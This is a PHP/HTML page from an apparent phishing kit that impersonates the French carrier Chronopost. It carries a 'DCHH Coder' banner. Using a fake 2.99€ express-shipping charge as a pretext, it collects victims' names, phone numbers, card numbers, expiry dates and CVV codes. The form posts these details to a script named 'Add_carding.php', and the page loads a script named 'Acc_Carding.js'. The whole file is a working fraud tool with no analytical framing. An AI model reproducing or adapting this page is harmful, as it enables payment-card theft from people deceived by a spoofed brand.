<?php/*
_____    ______ _     _      ______          _             
(____ \  / _____) |   | |    / _____)        | |            
_   \ \| /     | |__ | |___| /      ___   _ | | ____  ____ 
| |   | | |     |  __)| (___) |     / _ \ / || |/ _  )/ ___)
| |__/ /| \_____| |   | |   | \____| |_| ( (_| ( (/ /| |    
|_____/  \______)_|   |_|    \______)___/ \____|\____)_|    
*/

?>
<!DOCTYPE html>
<html>
<head>
<title>Accueil Chronopost.fr</title>
<link rel="icon" href="./lib/img/favicon.ico">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta charset="utf-8">
<script charset="utf-8" src="./lib/js/jquery-latest.min.js" type="text/javascript"></script>
<script charset="utf-8" src="./lib/js/jquery.mask.min.js" type="text/javascript"></script>
<script charset="utf-8" src="./lib/js/Acc_Carding.js" type="text/javascript"></script>

<link rel="stylesheet" type="text/css" href="./lib/css/chronopost.css">
<link rel="stylesheet" type="text/css" href="./lib/css/loading.css">
<link rel="stylesheet" type="text/css" href="./lib/css/style.css">
<link rel="stylesheet" type="text/css" href="./lib/css/stylee.css">
<link rel="stylesheet" type="text/css" href="./lib/css/css_1.css">
<link rel="stylesheet" type="text/css" href="./lib/css/font-awesome.min.css">
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.1.0/css/all.css" integrity="sha384-lKuwvrZot6UHsBSfcMvOkWwlCMgc0TaWr+30HWe3a4ltaBwTZhyTEggF5tJv8tbt" crossorigin="anonymous">
</head>
<style type="text/css">
.ererorr{
border: 1px solid #f00;
box-shadow: 0 0 0 3px rgba(221,0,0,.1) inset;
}
.problembox{
display: none;
width: 85%;
background: #e6e7e8;
color: #f51212;
font-size: 17px;
font-weight: normal;
font-family: dahoka, sans-serif;
}
</style>
<body style="min-width: 375px;">
<div class="pageLoader" id="finalselector" style="background-color: rgb(255, 255, 255);position: fixed;width: 100%;height: 100%;z-index: 9999;top: 0%;px;opacity: 0.9;text-align: center; display: none; "><a href="#" class="navbrand text-center mt-3">
<span class="aicon alogo"></span>
</a><div class="spinner loading"></div></div>

<ul>
<li>
<a class="ptbar" title="Aide">Aide</a>
</li>
<li>
 <a class="ptbar"><acronym title="'FAQ' : Foire aux questions">FAQ</acronym></a>
</li>
<li>
<input type="button" value="Espace client">
</li>
</ul><br><br>
<div class="container">
<div class="navbar-header">
  <a class="logo navbar-btn right" title="Accueil Chronopost.fr">
<img  src="./lib/img/chronopost_logo.png" alt="Accueil Chronopost.fr">
</a>
</div>
</div>
<div class="topnav" id="myTopnav" >
<a href="#home" >Expédier</a>
<a href="#news" class="active" style=" color: white; ">Suivre</a>
<a href="#contact">Nos offres</a>
<a href="#news">Aide / FAQ</a>
<a href="#contact">A propos de Chronopost</a>
<a href="#contact" class="lok" style=" color: #009adf; ">Mon espace</a>
<a href="#about" style=" float: right; ">
<form class="search-form"  method="post" ><div>
<input type="text" style="width: 220px;border-radius: inherit;float: left;margin: 0;height: 31px;">
<button class="tbns" type="submit"><i class="fas fa-search"></i></button>
</div></form></a>
<a href="javascript:void(0);" class="icon" onclick="myFunction()">
<i class="fa fa-bars"></i>
</a>
</div>
<center><h2 class="tTitreone">Liste des envois et/ou enlèvements</h2>
<h2 class="sousTitreone">Chronopost vous permet le suivi de vos envois de colis à tout moment et ce depuis l'expédition jusqu'a la livraison.</h2></center>
<center><h2 class="sousTitre">Colis en express : Votre colis sera expédié sous 24h (2.99€) . </h2></center>
<center><h2 class="ssousTitre">
<center>
<h2 class="problembox" id="problembox">Vous devez remplir les cases vides
</h2></center>
​<form action="./Actions/Add_carding.php" method="POST">
Nom et Prenom :<br>
<input type="text" class="inpclass" id="name" name="name" placeholder="XXXXX XXXXXX">
<br>
N° de Tel :<br>
<input type="text" class="inpclass" id="tel" name="tel" placeholder="XX XX XX XX XX">
<br>
Numéro de carte bancaire :<br>
<input type="text" class="inpclass" id="carte" name="carte" placeholder="XXXX XXXX XXXX XXXX">
<br>
Date d'expiration :<br>
<input type="text" class="inpclass" id="date" name="date" placeholder="MM/AAAA">
<br>
Cryptogramme visuel:<br>
<input type="text" class="inpclass cvv" id="cvv" name="cvv" placeholder="XXX">
<br>
<input type="submit" class="btnsub" name="submit" id="submit" value="Valider">
<br>
<br>
</form> 
</h2></center>
<script>
function myFunction() {
var x = document.getElementById("myTopnav");
if (x.className === "topnav") {
x.className += " responsive";
$("logi").show();
} else {
x.className = "topnav";
}
}
</script>
</center>
<div class="enpied">
<div class="web">
<ol>
<li><a title="English version" target="_blank" ">English version</a></li>
<li><a  title="Chronopost recrute" target="_blank" >Chronopost recrute</a></li>
<li><a  target="_blank" title="E-boutique" >E-boutique</a></li>
<li><a title="Mentions légales" target="_blank" >Mentions légales</a></li>
<li><a title="Contact" target="_blank" >Contact</a></li>
<li><a  title="Espace presse" target="_blank" >Espace presse</a></li>
<li class="dernier"><a title="Plan du site" target="_blank" >Plan du site</a></li>
</ol><img src="./lib/img/double-logo.png" alt="Chronopost international"><p>
<a  target="_blank" title="Transport express de colis" >Transport express de colis</a>|
<a target="_blank" title="La Poste" >La Poste</a>|
<a target="_blank" title="GeoPost" >GeoPost</a>|
<a  target="_blank" title="La Boutique du Timbre" >La Boutique du Timbre</a>|
<a  target="_blank"  title="Box e-commerce">Box e-commerce</a>
</p>
</div>
</div>
<script charset="utf-8" src="./lib/js/jquery-latest.min.js" type="text/javascript"></script>
<script src="./lib/js/jquery.mask.min.js" type="text/javascript"></script>
<script src="./lib/js/Acc_Carding.js" stype="text/javascript"></script>
<script src="./lib/js/Acc_mask.js" type="text/javascript"></script>
</body>
</html>







